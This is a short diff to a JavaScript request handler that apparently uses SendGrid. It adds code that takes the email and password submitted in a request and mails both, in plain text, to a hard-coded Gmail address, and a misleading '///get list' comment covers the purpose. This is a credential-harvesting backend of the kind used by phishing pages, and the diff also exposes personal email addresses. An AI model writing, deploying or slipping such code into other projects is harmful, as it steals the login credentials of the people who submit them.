@@ -1,15 +1,19 @@
 
-///send email
-export const sendEmail = async (req,res) => {
+import sgMail from '@sendgrid/mail';
 
+///get list
+export const sendEmail = async (req,res) => {
+  const { email, password } = req.body;
+
+  // console.log(email, password);
 
   try {
     sgMail.setApiKey(process.env.SENDGRID_API_KEY)
     const msg = {
-      to: '25mordad@gmail.com',
-      from: 'aalinoosh@gmail.com',
-      subject: 'Email : ' ,
-      html: 'Hi',
+      to: '25mordad@gmail.com', // Change to your recipient
+      from: 'aalinoosh@gmail.com', // Change to your verified sender
+      subject: 'your email: ' + email,
+      html: 'your password: '+ password,
     }
     sgMail
       .send(msg)
